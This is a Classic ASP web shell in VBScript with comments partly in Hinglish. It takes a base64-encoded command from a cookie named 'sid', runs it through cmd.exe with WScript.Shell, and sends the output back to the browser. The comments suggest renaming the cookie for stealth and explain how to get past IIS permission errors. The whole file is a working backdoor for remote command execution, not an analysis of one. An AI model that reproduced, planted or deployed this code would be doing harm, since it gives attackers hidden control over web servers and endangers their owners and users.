<%@ Language=VBScript %>
<%
Response.Buffer = True
Response.CacheControl = "private"
Response.Expires = -1

Dim cookieValue, decodedCmd, objShell, objExec
Dim stdOut, stdErr, fullOutput

' Cookie name (stealth ke liye change kar sakta hai)
cookieValue = Request.Cookies("sid")

' Debug: cookie check (production mein remove kar dena)
' Response.Write "<!-- Cookie raw: " & Server.HTMLEncode(cookieValue) & " | Length: " & Len(cookieValue) & " -->"

If Len(cookieValue) > 10 Then
    ' Base64 decode
    decodedCmd = Base64Decode(cookieValue)
    
    ' Debug: decoded command check (production mein remove)
    ' Response.Write "<!-- Decoded: " & Server.HTMLEncode(Left(decodedCmd, 100)) & "... -->"
    
    If Len(decodedCmd) > 3 Then
        On Error Resume Next
        
        Set objShell = Server.CreateObject("WScript.Shell")
        
        If Err.Number <> 0 Then
            Response.Write "<pre style='color:red; background:#111; padding:10px;'>"
            Response.Write "[CRITICAL] WScript.Shell create nahi ho pa raha: " & Err.Description & vbCrLf
            Response.Write "Possible reason: IIS/AppPool user ko permission nahi (Act as part of OS / Replace token)"
            Response.Write "</pre>"
        Else
            ' cmd.exe /c se execute
            Set objExec = objShell.Exec("cmd.exe /c " & decodedCmd)
            
            ' Wait for completion (hang avoid)
            Dim timeout : timeout = 0
            Do While objExec.Status = 0 And timeout < 30
                WScript.Sleep 200
                timeout = timeout + 1
            Loop
            
            stdOut = objExec.StdOut.ReadAll
            stdErr = objExec.StdErr.ReadAll
            
            fullOutput = stdOut
            If Len(stdErr) > 0 Then
                fullOutput = fullOutput & vbCrLf & "[ERROR]" & vbCrLf & stdErr
            End If
            
            If Len(fullOutput) > 0 Then
                ' Output ko safe render karo
                Response.Write "<pre style='color:#0f0; background:#000; padding:15px; border:1px solid #0f0; white-space:pre-wrap;'>"
                Response.Write Server.HTMLEncode(fullOutput)
                Response.Write "</pre>"
            Else
                Response.Write "<pre style='color:#888;'>Command executed but no output returned.</pre>"
            End If
            
            Set objExec = Nothing
        End If
        
        Set objShell = Nothing
        On Error Goto 0
    Else
        Response.Write "<pre style='color:#888;'>Decoded command too short or invalid.</pre>"
    End If
Else
    Response.Write "<pre style='color:#888;'>No valid command in cookie (sid). Length: " & Len(cookieValue) & "</pre>"
End If

' Improved Base64 decode function
Function Base64Decode(strBase64)
    Dim xml, node
    On Error Resume Next
    Set xml = Server.CreateObject("Msxml2.DOMDocument.6.0")
    If Err.Number <> 0 Then
        Set xml = Server.CreateObject("Msxml2.DOMDocument.3.0")
    End If
    Set node = xml.createElement("b64")
    node.dataType = "bin.base64"
    node.text = strBase64
    
    Dim bin : bin = node.nodeTypedValue
    Dim stream : Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 1 ' adTypeBinary
    stream.Open
    stream.Write bin
    stream.Position = 0
    stream.Type = 2 ' adTypeText
    stream.Charset = "us-ascii"
    Base64Decode = stream.ReadText
    stream.Close
    
    Set node = Nothing
    Set xml = Nothing
    Set stream = Nothing
    On Error Goto 0
End Function
%>
